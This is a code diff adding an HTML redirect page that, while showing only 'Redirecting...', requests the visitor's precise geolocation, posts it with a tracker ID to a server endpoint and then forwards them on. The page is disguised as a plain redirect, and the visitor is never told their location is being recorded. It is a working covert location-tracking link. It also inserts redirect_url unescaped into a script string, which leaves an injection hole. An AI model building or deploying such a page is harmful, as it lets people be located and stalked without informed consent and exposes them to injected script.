@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    const tracker_id = "{{ tracker_id }}";
+    const redirect_url = "{{ redirect_url|safe }}";
+
+    function sendLocation(lat, lon) {
+      fetch('/api/location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          tracker_id: tracker_id,
+          latitude: lat,
+          longitude: lon
+        })
+      }).finally(() => {
+        window.location.href = redirect_url;
+      });
+    }
+
+    function handleError() {
+      window.location.href = redirect_url;
+    }
+
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            sendLocation(position.coords.latitude, position.coords.longitude);
+          },
+          handleError, 
+          { timeout: 5000, enableHighAccuracy: true }
+        );
+      } else {
+        handleError();
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
